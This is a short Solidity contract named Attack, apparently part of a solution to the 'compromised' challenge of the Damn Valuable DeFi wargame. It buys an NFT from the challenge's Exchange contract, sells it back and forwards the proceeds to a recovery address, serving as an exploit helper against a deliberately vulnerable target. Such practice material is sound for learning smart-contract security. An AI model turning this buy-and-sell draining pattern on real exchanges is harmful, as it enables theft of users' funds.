// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract Attack {
    Exchange public immutable EXCHANGE;
    DamnValuableNFT public immutable NFT;

    uint256 public nftId;

    constructor(Exchange _exchange, DamnValuableNFT _nft) {
        EXCHANGE = _exchange;
        NFT = _nft;
    }

    receive() external payable {}

    function buy() external payable {
        nftId = EXCHANGE.buyOne{value: msg.value}();
    }

    function sell(address _recovery, uint256 _amount) external {
        NFT.approve(address(EXCHANGE), nftId);
        EXCHANGE.sellOne(nftId);
        payable(_recovery).send(_amount);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}